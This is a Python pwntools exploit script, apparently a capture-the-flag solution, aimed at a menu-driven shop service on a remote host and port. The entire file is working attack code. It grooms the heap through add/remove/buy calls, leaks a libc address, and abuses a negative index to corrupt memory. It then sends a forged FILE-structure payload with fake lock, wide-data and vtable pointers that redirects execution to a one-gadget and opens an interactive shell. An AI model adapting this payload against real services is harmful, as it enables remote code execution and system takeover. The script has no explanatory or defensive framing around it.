#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "110.10.147.102"
port = 7767
context.arch = "amd64"    
r = remote(host,port)
itemlist = []
def add(idx,count):
    global itemlist
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil("1. ")
    data = r.recvuntil("----")[:-4]
    if data not in itemlist :
        itemlist.append(data)
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(count))

def remove(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(idx))

def showall():
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline("2")

def buy(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(idx))

def buyall(clean):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    if clean :
        r.sendline("1")
    else:
        r.sendline("2")
def searchitem(name):
    r.recvuntil(":")
    r.sendline("1")
    data = r.recvuntil("item?")
    while name not in data :
        r.sendline("9")
        r.recvuntil(":")
        r.sendline("1")
        data = r.recvuntil("item?")
    idx = data.find(name)
    r.recvuntil(":")
    r.sendline(data[idx-3])

while len(itemlist) < 16:
    add(1,0)
buyall(1)
itemlist = []
while len(itemlist) < 15:
    add(1,0)
for i in range(15):
    remove(0)
itemlist = []
while len(itemlist) < 3 :
    add(1,0)
buy(1)
show(0)
r.recvuntil("Name: ")
name = r.recvuntil("\n")[:-1]
print name
r.recvuntil("Amount: ")
libc = int(r.recvuntil("\n")) - 0x3c4b78
print hex(libc)
searchitem(name)
r.recvuntil(":")
r.sendline(str(-616))
add(1,0)
r.recvuntil(":")
lock = libc + 0x3c6790
wide = libc  + 0x3c49c0
vtable = libc + 0x3c36e0
magic = libc + 0xf02a4

payload = "\x00"*5 + p64(lock) + p64(0xffffffffffffffff) + p64(0) + p64(wide)+ p64(0)*3 + p64(0xffffffff)  + p64(0)*2 + p64(vtable)

payload += "\x00"*0x150 + p64(magic)
r.sendline(payload)
buy(0)
r.interactive()
